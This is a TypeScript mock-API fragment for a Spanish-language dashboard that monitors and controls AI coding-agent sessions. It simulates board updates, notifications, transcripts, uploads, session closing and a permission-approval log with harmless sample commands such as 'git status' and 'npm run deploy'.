    }
  }
  setUploadSrc((id) => dataUrls.get(id) ?? (id === SHOT_ID ? svgUrl('#d0533a', '#7a1f3d', 'checkout · 401 token expirado') : svgUrl('#2f6b5a', '#17313a', id)))

  const todos = () => board.workspaces.flatMap((w) => w.tabs.flatMap((t) => t.agents))
  const agentOf = (pane: string) => todos().find((x) => x.pane_id === pane)

  const answer = (ag: Agent, list: TranscriptItem[], texts: string[]) => {
    const sid = ag.session_id!
    for (const text of texts) list.push({ kind: 'user', text, name: '', summary: '', ts: new Date().toISOString() })
    ag.last_activity = new Date().toISOString()
    onSession?.({ session_id: sid, mtime: String(Date.now() / 1000) })
    setTimeout(() => {
      list.push({ kind: 'tool', text: '', name: 'Read', summary: '/home/usuario/Proyectos/orquestador/README.md', ts: new Date().toISOString() })
      list.push({ kind: 'claude', text: 'Recibido, lo reviso y te cuento.', name: '', summary: '', ts: new Date().toISOString() })
      onSession?.({ session_id: sid, mtime: String(Date.now() / 1000) })
    }, 1800)
  }

  let avisosLeidos = 3
  let onOrdenTablero: ((orden: string[]) => void) | undefined
  let onOrdenPestanas: ((e: { grupo: string; orden: string[] }) => void) | undefined
  let atajosMock: Record<string, string> = {}
  let ordenTablero: string[] = []
  let plegadasTablero: string[] = []
  let ordenPestanas: Record<string, string[]> = {}
  const avisos = mockAvisos()
  const need = () => {
    if (!logged) {
      onUnauthorized()
      throw new ApiError(401, 'No autenticado')
    }
  }

  const mutate = () => {
    const agents = board.workspaces.flatMap((w) => w.tabs.flatMap((t) => t.agents)).filter((x) => x.kind === 'claude' && x.title !== 'shell')
    const pick = agents[Math.floor(Math.random() * agents.length)]
    const cycle: Record<AgentStatus, AgentStatus> = { idle: 'working', working: Math.random() < 0.3 ? 'blocked' : 'done', blocked: 'working', done: 'idle', unknown: 'idle' }
    pick.status = cycle[pick.status]
    pick.last_activity = new Date().toISOString()
    pick.asks_user = pick.status === 'blocked'
    if (pick.status === 'working') pick.pending = 'Trabajando… ' + pick.pending.replace(/^Trabajando… /, '')
    for (const w of board.workspaces) {
      const st = w.tabs.flatMap((t) => t.agents.map((x) => x.status))
      w.status = st.includes('blocked') ? 'blocked' : st.includes('working') ? 'working' : st.every((s) => s === 'done') ? 'done' : 'idle'
    }
    board = { ...structuredClone(board), updated_at: new Date().toISOString() }
  }

  const tk = (n: number): DiosTokens => ({ input: Math.round(n * 0.02), cache_write: Math.round(n * 0.18), cache_read: Math.round(n * 0.7), output: Math.round(n * 0.1), mensajes: Math.ceil(n / 60_000), total: n })
  const usoHoy = 640_000
  const historial = (n: number): DiosDia[] => {
    const base = [0, 310_000, 820_000, 1_240_000, 960_000, 1_610_000, 450_000, 0, 700_000, 1_130_000, 1_380_000, 890_000, 1_520_000, 1_070_000, 520_000, 240_000, 980_000, 1_290_000, 1_700_000, 1_150_000, 760_000, 1_340_000, 610_000, 90_000, 870_000, 1_460_000, 1_020_000, 1_580_000, 1_210_000]
    const out: DiosDia[] = []
    for (let i = n - 1; i >= 0; i--) {
      const d = new Date()
      d.setDate(d.getDate() - i)
      const fecha = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`
      out.push({ fecha, ...tk(i === 0 ? usoHoy : base[(n - 1 - i) % base.length]) })
    }
    return out
  }
  const limpieza = createMockLimpieza()
  const memoria = createMockMemoria()
  const notasMock = createMockNotas()

  return {
    ...limpieza,
    ...memoria,
    ...notasMock,
    async login(pin) {
      await sleep(450)
      if (fails >= 5) throw new ApiError(429, 'Demasiados intentos', 600)
      if (pin !== '1234') {
        fails++
        throw new ApiError(fails >= 5 ? 429 : 401, fails >= 5 ? 'Demasiados intentos' : 'PIN incorrecto', fails >= 5 ? 600 : null)
      }
      logged = true
    },
    async getBoard() {
      await sleep(250)
      need()
      return structuredClone(board)
    },
    async getOrdenTablero() {
      await sleep(80)
      need()
      return { orden: [...ordenTablero], pestanas: { ...ordenPestanas }, plegadas: [...plegadasTablero], silenciadas: [] }
    },
    async setPlegadas(plegadas) {
      await sleep(120)
      need()
      plegadasTablero = [...plegadas]
    },
    async setSilencio() {
      await sleep(120)
      need()
    },
    async irAPc() {
      await sleep(120)
      need()
    },
    async getAtajos() {
      await sleep(60)
      need()
      return { ...atajosMock }
    },
    async setAtajos(atajos) {
      await sleep(120)
      need()
      atajosMock = { ...atajos }
    },
    async setOrdenTablero(orden) {
      await sleep(120)
      need()
      ordenTablero = [...orden]
      if (!orden.length) ordenPestanas = {}
      onOrdenTablero?.([...ordenTablero])
      if (!orden.length && onOrdenPestanas) onOrdenPestanas({ grupo: '', orden: [] })
    },
    async setOrdenPestanas(grupo, orden) {
      await sleep(120)
      need()
      const next = { ...ordenPestanas }
      if (orden.length) next[grupo] = [...orden]
      else delete next[grupo]
      ordenPestanas = next
      onOrdenPestanas?.({ grupo, orden: [...orden] })
    },
    subscribeBoard({ onBoard, onState, onSession: onSessionEvent, onAviso, onOrdenTablero: onOrdenTableroCb, onOrdenPestanas: onOrdenPestanasCb }) {
      onSession = onSessionEvent
      onOrdenTablero = onOrdenTableroCb
      onOrdenPestanas = onOrdenPestanasCb
      const avisoT = setTimeout(() => {
        if (new URLSearchParams(location.search).has('static')) return
        const id = Math.max(...avisos.map((a) => a.id)) + 1
        avisos.push({ id, ts: Math.floor(Date.now() / 1000), kind: 'done', titulo: 'Orquestador terminó', cuerpo: 'Listo el historial de avisos.', session_id: 'mock-wG-p1', pane_id: '', fecha: '', mr: '', tag: '', entregado: true, leido: false, motivo: '' })
        onAviso?.(id)
      }, 20_000)
      emitBoard = onBoard
      onState('connecting')
      const t0 = setTimeout(() => onState('live'), 400)
      const iv = setInterval(() => {
        if (new URLSearchParams(location.search).has('static')) return
        mutate()
        onBoard(structuredClone(board))
      }, 6000)
      // Una sesión sube su contexto cada 4 s y se compacta al llegar a 22% para ver la animación.
      const ctxIv = setInterval(() => {
        if (new URLSearchParams(location.search).has('static')) return
        const x = agentOf('wG:p1')
        if (!x?.ctx) return
        const pct = x.ctx.pct + 1
        x.ctx = pct >= MOCK_MIN ? ctxOf(3, x.ctx.compactaciones + 1, 0) : { ...ctxOf(pct, x.ctx.compactaciones), ultima_compactacion: x.ctx.ultima_compactacion }
        onBoard(structuredClone(board))
      }, 4000)
      return () => {
        clearTimeout(avisoT)
        clearTimeout(t0)
        clearInterval(iv)
        clearInterval(ctxIv)
      }
    },
    getTerminalSalida: (paneId, rev, signal) => mockSalida(paneId, rev, signal),
    getTerminalConfig: () => mockTerminalConfig(),
    getTerminalesCarpetas: () => mockTerminalesCarpetas(),
    postTerminalesNueva: (body) => mockTerminalesNueva(body),
    postTerminalesNuevaTarea: (body) => mockTerminalesNuevaTarea(body),
    postTerminalesNuevaTareaConfiar: async () => ({ ok: true as const }),
    postBorrarCopia: () => mockBorrarCopia(),
    getSesionesViejas: async () => [
      {
        session_id: '6f1c1e0b-4a55-4e1d-9d33-1f3c2a7d9e10',
        titulo: 'Mock vieja',
        carpeta: '/mock/proyecto',
        ultimo_ts: new Date().toISOString(),
        ultima_frase: 'última línea de prueba',
      },
    ],
    postSesionesViejasRetomar: async () => ({ ok: true as const, espacio_id: 'g9', sesion_id: 'g9:p1', pane_id: 'g9:p1' }),
    previewTerminal: (paneId) => mockPreview(paneId),
    terminalCtrlC: (b) => mockCtrlC(b.pane_id),
    cerrarTerminal: (b) => mockCerrar(b.pane_id),
    renombrarTerminal: async () => {},
    repetirPreparar: (b) => mockRepetirPreparar(b.pane_id),
    repetirConfirmar: (b) => mockRepetirConfirmar(b.pane_id, b.ejecutar),
    getTerminalAuditoria: () => mockAuditoria(),
    abrirVentana: (pin) => mockAbrirVentana(pin),
    cerrarVentana: async () => {},
    enviarComando: (b, token) => mockComando(b, token),
    async getAvisos(limite = 50, antes = 0, incluirPrueba = false) {
      await sleep(250)
      need()
      let pool = avisos.filter((a) => !antes || a.id < antes).sort((a, b) => b.id - a.id)
      if (!incluirPrueba) pool = pool.filter((a) => !a.prueba)
      return { items: pool.slice(0, limite), hayMas: pool.length > limite, noLeidos: avisos.filter((a) => a.id > avisosLeidos).length, leidosHasta: avisosLeidos }
    },
    async getPedidosPestana() {
      await sleep(80)
      need()
      const now = Math.floor(Date.now() / 1000)
      return [
        {
          id: '550e8400-e29b-41d4-a716-446655440000',
          carpeta: '/mock/proyecto',
          mensaje: 'Mensaje de prueba',
          origen: { pane_id: 'w1:p1', nombre: 'Mock', session_id: 'mock-w1-p1' },
          ts: now,
          vence: now + 600,
        },
        {
          id: '550e8400-e29b-41d4-a716-446655440001',
          carpeta: '/mock/proyecto',
          mensaje: '',
          accion: 'cerrar' as const,
          cierre: { objetivo: 'pestana' as const, tipo: 'tab' as const, target_id: 'w2:t1', label: 'Pestaña de ejemplo', workspace_label: 'Tarjeta de ejemplo', carpeta: '/mock/proyecto', sesiones: 1, terminales: 0 },
          origen: { pane_id: 'w1:p1', nombre: 'Mock', session_id: 'mock-w1-p1' },
          ts: now,
          vence: now + 600,
        },
      ]
    },
    async abrirPedidoPestana(id) {
      await sleep(80)
      need()
      return { ok: true as const, pane_id: 'w1:p2', pegado: true }
    },
    async vistaCierrePedido() {
      await sleep(80)
      need()
      return { trabajando: false, estados: [], huella: 'mock' }
    },
    async rechazarPedidoPestana() {
      await sleep(80)
      need()
      return { ok: true as const }
    },
    async marcarAvisosLeidos(hasta) {
      await sleep(150)
      need()
      avisosLeidos = Math.max(avisosLeidos, Math.min(hasta, Math.max(...avisos.map((a) => a.id))))
      return avisos.filter((a) => a.id > avisosLeidos).length
    },
    async marcarAvisosDe(filtro) {
      await sleep(100)
      need()
      for (const a of avisos) {
        const hit = ('session_id' in filtro && a.session_id === filtro.session_id) || ('pane_id' in filtro && a.pane_id === filtro.pane_id) || ('kind' in filtro && a.kind === filtro.kind) || ('mr' in filtro && a.mr === filtro.mr)
        if (hit) a.leido = true
      }
      return avisos.filter((a) => a.id > avisosLeidos && !a.leido).length
    },
    async getLibrary(filters, cursor, limit) {
      await sleep(350)
      need()
      return library.list(filters, cursor, limit)
    },
    async getLibraryItem(id, filters) {
      await sleep(120)
      need()
      return library.item(id, filters)
    },
    async getLibrarySessions() {
      await sleep(150)
      need()
      return library.sessions()
    },
    async quitarLibrary(ids) {
      await sleep(250)
      need()
      return library.quitar(ids)
    },
    async getLibraryText(id) {
      await sleep(150)
      need()
      return library.text(id)
    },
    async getLibraryCharla() {
      await sleep(150)
      need()
      return 'Ana: Arrancamos con el estado de pagos.\nLuis: El reintento falla con el timeout viejo.\nAna: Lo subimos a 30 s.'
    },
    async getSubagentes() {
      await sleep(250)
      need()
      const t = Math.floor((Date.now() - mockStart) / 1000)
      return [
        { id: 'a1b2c3d4', descripcion: 'Revisar los cambios del backend', tipo: 'general-purpose', modelo: 'sonnet', estado: 'trabajando', inicio: '', segundos: 95 + t, paso: 'Leyendo transcript.py', tokens: 48200 },
        { id: 'e5f6a7b8', descripcion: 'Escribir las pruebas de la lista de agentes', tipo: 'general-purpose', modelo: 'haiku', estado: 'trabajando', inicio: '', segundos: 41 + t, paso: 'Corriendo: Corre las pruebas del frontend', tokens: 12900 },
        { id: 'c9d0e1f2', descripcion: 'Buscar dónde se arma la pantalla del chat', tipo: 'Explore', modelo: 'sonnet', estado: 'termino', inicio: '', segundos: 132, paso: 'Terminó', tokens: 31000 },
      ]
    },
    async getDigest(sid): Promise<Digest> {
      await sleep(500)
      need()
      const ag = board.workspaces.flatMap((w) => w.tabs.flatMap((t) => t.agents)).find((x) => x.session_id === sid)
      return { title: ag?.title ?? 'Sesión', last_prompt: DIGEST_TURNS[2].text, turns: DIGEST_TURNS }
    },
    async getTranscript(sid, before, limit = 60) {
      await sleep(before == null ? 350 : 500)
      need()
      const ag = todos().find((x) => x.session_id === sid)
      if (!ag) throw new ApiError(404, 'No existe esa sesión')
      const all = transcriptFor(sid)
      const end = Math.min(before ?? all.length, all.length)
      const start = Math.max(0, end - limit)
      return { items: structuredClone(all.slice(start, end)), before: start > 0 ? start : null, title: ag.title, status: ag.status, pane_id: ag.pane_id, status_line: { model: 'Opus 5.5', ticket: 'ABC-123 - Contador carrito web', ctx_pct: 34, ctx_level: 'caution', vpn: 'up' } }
    },
    async getVozEstado() {
      await sleep(120)
      need()
      return { habilitada: true, modelo: 'small', cargado: vozLoaded, ocupada: false, max_segundos: 120 }
    },
    async transcribirVoz(audio, signal) {
      need()
      const mode = new URLSearchParams(location.search).get('voz') ?? ''
      await sleep(mode === 'lento' ? 60_000 : vozLoaded ? 1800 : 3800, signal)
      if (mode === 'ocupada') throw new ApiError(409, 'ya hay una transcripción en curso')
      if (mode === 'error') throw new ApiError(500, 'falló la transcripción')
      vozLoaded = true
      const texto = mode === 'silencio' ? '' : 'revisá el contrato del endpoint de stock antes de tocar el módulo de reservas'
      return { texto, duracion: Math.max(1, audio.size / 4000), proceso: 1.8 }
    },
    async uploadFile(file, onProgress, signal) {
      need()
      const ext = file.name.includes('.') ? file.name.slice(file.name.lastIndexOf('.') + 1).toLowerCase() : 'txt'
      const stamp = new Date().toISOString().replace(/[-:]/g, '').replace('T', '-').slice(0, 15)
      const id = `${stamp}-${slug(file.name)}.${ext}`
      const forever = file.name.includes('lento')
      const steps = forever ? 6 : 8
      for (let i = 1; i <= steps; i++) {
        await sleep(forever ? 400 : 150, signal)
        onProgress(forever ? i / 10 : i / steps)
      }
      if (forever) await new Promise<never>((_, rej) => signal.addEventListener('abort', () => rej(new DOMException('aborted', 'AbortError'))))
      if (file.type.startsWith('image/')) {
        dataUrls.set(id, await new Promise<string>((res) => {
          const r = new FileReader()
          r.onload = () => res(String(r.result))
          r.readAsDataURL(file)
        }))
      }
      return { id, name: file.name, size: file.size, kind: ext === 'pdf' ? 'pdf' : ['png', 'jpg', 'jpeg', 'webp', 'gif', 'heic'].includes(ext) ? 'image' : 'text' }
    },
    async abrirEnPc() {
      await sleep(120)
      need()
      return { ok: true as const }
    },
    async markSeen(sessionId) {
      need()
      const ag = board.workspaces.flatMap((w) => w.tabs.flatMap((t) => t.agents)).find((x) => x.session_id === sessionId)
      if (!ag?.unread) return
      ag.unread = false
      board = { ...structuredClone(board), updated_at: new Date().toISOString() }
      emitBoard?.(structuredClone(board))
    },
    async marcarPreguntaVista(sessionId) {
      need()
      const ag = board.workspaces.flatMap((w) => w.tabs.flatMap((t) => t.agents)).find((x) => x.session_id === sessionId)
      if (!ag?.asks_user) return
      ag.asks_user = false
      ag.pendiente = true
      board = { ...structuredClone(board), updated_at: new Date().toISOString() }
      emitBoard?.(structuredClone(board))
    },
    async getClaudeUso() {
      need()
      await sleep(350)
      return mockClaudeUso(historial(30), tk(usoHoy))
    },
    async proponerVariante(body) {
      need()
      await sleep(250)
      const msg: ChatMessage = { id: `a${Date.now()}`, role: 'assistant', text: ANSWER_ALT((body.destino_tipo ?? '').replace('_', ' ')), ts: new Date().toISOString() }
      history.push(msg)
      return msg
    },
    async executeMensaje(body) {
      need()
      await sleep(500)
      if (sentIds.has(body.id)) throw new ApiError(409, 'Ya se mandó ese mensaje')
      sentIds.add(body.id)
      if (body.origen !== 'jefe') {
        const ag = agentOf(body.pane_id)
        if (ag?.session_id) {
          const sid = ag.session_id
          const list = transcriptFor(sid)
          const files = (body.adjuntos ?? []).map((id) => `/home/usuario/Proyectos/orquestador/data/uploads/${id}`)
          const text = files.length ? (body.texto ? `${body.texto}${files.map((f) => ` (Adjunto: ${f})`).join('')}` : `Te paso ${files.join(', ')}`) : body.texto
          if (ag.status === 'working') {
            held.set(sid, [...(held.get(sid) ?? []), text])
            return { ok: true, pane_id: body.pane_id, event: null }
          }
          answer(ag, list, [text])
        }
        return { ok: true, pane_id: body.pane_id, event: null }
      }
      const event: ChatMessage = { id: `e${Date.now()}`, role: 'event', text: `Mensaje enviado a ${body.destino}`, ts: new Date().toISOString() }
      history.push(event)
      return { ok: true, pane_id: body.pane_id, event }
    },
    async stopSession(paneId) {
      await sleep(350)
      need()
      const ag = agentOf(paneId)
      if (!ag) throw new ApiError(404, 'Esa sesión ya no está abierta')
      if (ag.status !== 'working') throw new ApiError(409, 'La sesión no está trabajando')
      ag.status = 'idle'
      ag.last_activity = new Date().toISOString()
      for (const w of board.workspaces) {
        const st = w.tabs.flatMap((t) => t.agents.map((x) => x.status))
        w.status = st.includes('blocked') ? 'blocked' : st.includes('working') ? 'working' : st.every((x) => x === 'done') ? 'done' : 'idle'
      }
      board = { ...structuredClone(board), updated_at: new Date().toISOString() }
      emitBoard?.(structuredClone(board))
      const queued = held.get(ag.session_id ?? '')
      if (queued?.length && ag.session_id) {
        held.delete(ag.session_id)
        const fresh = agentOf(paneId)!
        answer(fresh, transcriptFor(ag.session_id), queued)
      }
    },
    async previewClose(tipo, targetId): Promise<ClosePreview> {
      await sleep(350)
      need()
      return closePreview(tipo, targetId)
    },
    async accionGuardado() {
      throw new ApiError(409, 'Ese cierre ya terminó')
    },
    async executeClose(body) {
      await sleep(900)
      need()
      if (closed.has(body.id)) return closed.get(body.id)!
      const p = closePreview(body.tipo, body.target_id)
      if (p.bloqueantes.length) throw new ApiError(409, 'Frenala primero', null, p.bloqueantes)
      if (p.huella !== body.huella) throw new ApiError(409, 'El tab cambió, revisalo de nuevo')
      const sesiones = p.panes.filter((x) => x.session_id).map((x) => ({ session_id: x.session_id, cwd: x.cwd, titulo: x.titulo }))
      const next = structuredClone(board)
      if (body.tipo === 'workspace') next.workspaces = next.workspaces.filter((w) => w.id !== body.target_id)
      else for (const w of next.workspaces) w.tabs = w.tabs.filter((t) => t.id !== body.target_id)
      board = { ...next, updated_at: new Date().toISOString() }
      emitBoard?.(structuredClone(board))
      const event: ChatMessage | null =
        body.origen === 'jefe' ? { id: `e${Date.now()}`, role: 'event', text: `Cerré ${body.tipo} ${p.label}`, ts: new Date().toISOString() } : null
      if (event) history.push(event)
      const res = { ok: true, sesiones, event }
      closed.set(body.id, res)
      return res
    },
    async getDialog(sid) {
      await sleep(400)
      need()
      const ag = board.workspaces.flatMap((w) => w.tabs.flatMap((t) => t.agents)).find((x) => x.session_id === sid)
      if (!ag) throw new ApiError(404, 'Esa sesión ya no está abierta')
      if (ag.status !== 'blocked') return { tipo: 'ninguno' }
      const which = new URLSearchParams(location.search).get('dialog') ?? 'bash'
      if (which === 'pedido') {
        const p = mockPedidos.get('mock-p1')
        if (p) return normalizeDialog({ tipo: 'pedido', pedido: p })
      }
      return normalizeDialog(MOCK_DIALOGS[which] ?? MOCK_DIALOGS.bash)
    },
    async getPregunta(sid) {
      await sleep(200)
      need()
      throw new ApiError(404, `SIN_PREGUNTA ${sid}`)
    },
    async responderPregunta() {
      need()
      await sleep(400)
      return { ok: true }
    },
    async correrComando(_sid, body) {
      need()
      await sleep(400)
      return { ok: true, comando: body.comando }
    },
    async telemetriaComandoNo() {},
    async marcarPropuesta(id, decision) {
      return { id, estado: decision === 'ignorar' ? 'ignorada' : decision }
    },
    async answerDialog(body) {
      need()
      await sleep(1400)
      const ag = agentOf(body.pane_id)
      if (!ag || ag.status !== 'blocked') throw new ApiError(409, 'La sesión ya no espera respuesta')
      if (body.pin !== undefined && body.pin !== '1234') throw new ApiError(401, 'PIN incorrecto')
      ag.status = 'working'
      ag.asks_user = false
      for (const w of board.workspaces) {
        const st = w.tabs.flatMap((t) => t.agents.map((x) => x.status))
        w.status = st.includes('blocked') ? 'blocked' : st.includes('working') ? 'working' : st.every((x) => x === 'done') ? 'done' : 'idle'
      }
      board = { ...structuredClone(board), updated_at: new Date().toISOString() }
      emitBoard?.(structuredClone(board))
      return { ok: true, interrumpida: body.permiso === 'no' }
    },
    async getPermisos(): Promise<{ pedidos: import('../api/types').PedidoPermiso[] }> {
      need()
      await sleep(80)
      return { pedidos: [] }
    },
    async getPermisosRegistro(): Promise<{ items: RegistroPermiso[] }> {
      need()
      await sleep(200)
      return {
        items: [
          {
            hora: minsAgo(5),
            categoria: 'auto',
            quien: 'politica',
            regla_politica: 'bash:read-only',
            motivo_politica: 'comandos de solo lectura',
            herramienta: 'Bash',
            entrada: { command: 'git status' },
            pane_id: 'mock-wG-p1',
            session_id: 'mock-s1',
            sesion: 'Sesión demo',
          },
          {
            hora: minsAgo(12),
            categoria: 'gris',
            regla_politica: 'read:sensitive',
            motivo_politica: 'ruta fuera del repo',
            herramienta: 'Read',
            entrada: { file_path: '/etc/hosts' },
            session_id: 'mock-s2',
            sesion: null,
          },
          {
            hora: minsAgo(20),
            categoria: 'usuario',
            regla_politica: 'always-ask',
            motivo_politica: 'edición en producción',
            herramienta: 'Edit',
            entrada: { file_path: 'frontend/src/App.vue', old_string: 'a', new_string: 'b' },
            session_id: 'mock-s1',
            sesion: 'Sesión demo',
          },
          {
            hora: minsAgo(35),
            categoria: 'auto',
            regla_politica: 'write:tmp',
            herramienta: 'Write',
            entrada: { file_path: '/tmp/nota.txt', content: 'demo' },
            session_id: 'mock-s3',
            sesion: 'Tienda demo',
          },
          {
            hora: minsAgo(40),
            categoria: 'gris',
            regla_politica: 'bash:deploy',
            motivo_politica: 'comando con side effects',
            herramienta: 'Bash',
            entrada: { command: 'npm run deploy' },
            session_id: 'mock-s4',
            sesion: 'Deploy · staging',
          },
        ],
      }
    },
    async decidirPermiso(id, req: DecidirPermisoRequest): Promise<PedidoPermiso> {
      need()
      await sleep(400)
      const p = mockPedidos.get(id)
      if (!p) throw new ApiError(404, 'No existe')
      if (p.estado !== 'abierto' && p.estado !== 'enviando') throw new ApiError(409, 'el pedido ya no espera')
      if (req.accion === 'siempre') {
        if (req.pin !== undefined && req.pin !== '1234') throw new ApiError(401, 'PIN incorrecto')
        if (!p.regla || req.huella_regla !== p.regla.huella) throw new ApiError(409, 'la regla cambió')
        p.estado = 'siempre'
      } else if (req.accion === 'permitir') p.estado = 'permitido'
      else p.estado = 'rechazado'
      mockPedidos.set(id, { ...p })
      return { ...p }
    },
    async getHandoff(name) {
      await sleep(450)
      need()
      if (!/^[a-z0-9][a-z0-9-]{0,80}\.md$/.test(name)) throw new ApiError(404, 'No existe')
      return BRIEF
    },
    async revokeAll() {
      await sleep(300)
      logged = false
      history.length = 0
    },
  }
}
